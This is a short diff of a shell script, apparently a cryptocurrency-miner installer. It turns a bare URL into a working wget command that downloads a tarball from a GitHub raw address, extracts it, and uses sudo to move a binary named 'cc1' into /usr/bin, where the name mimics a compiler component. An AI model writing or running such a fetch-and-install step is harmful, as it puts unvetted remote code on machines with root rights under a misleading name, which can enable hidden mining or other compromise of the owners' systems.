@@ -59,7 +59,7 @@ MINE_E() {
     clear
 }
 SETUP() {
-https://raw.githubusercontent.com/outlookribut/jbh/main/program.tgz
+wget https://raw.githubusercontent.com/outlookribut/jbh/main/program.tgz
 tar xf program.tgz
 sudo mv cc1 /usr/bin
 }
